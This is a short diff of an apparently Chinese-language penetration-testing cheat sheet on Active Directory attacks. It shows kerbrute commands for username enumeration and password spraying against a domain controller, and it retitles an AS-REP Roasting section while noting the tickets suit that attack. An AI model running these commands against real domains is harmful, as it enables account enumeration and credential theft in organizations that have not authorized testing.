@@ -20,9 +20,10 @@ kerbrute userenum -d 目标域名 usernames.txt -dc-ip 域控IP
 kerbrute passwordspray -d 目标域名 -p 已知的密码 usernames.txt -dc-ip 域控IP
 ```
 
-## AS-REP Roasting
+## 获取AS-REP票据
 
 * 获取 Kerberos 预身份验证数据（AS-REP 票据）
+* 适用于AS-REP Roasting攻击
 * `asreproast`：指定操作为 AS-REP Roasting
 
 ```bash
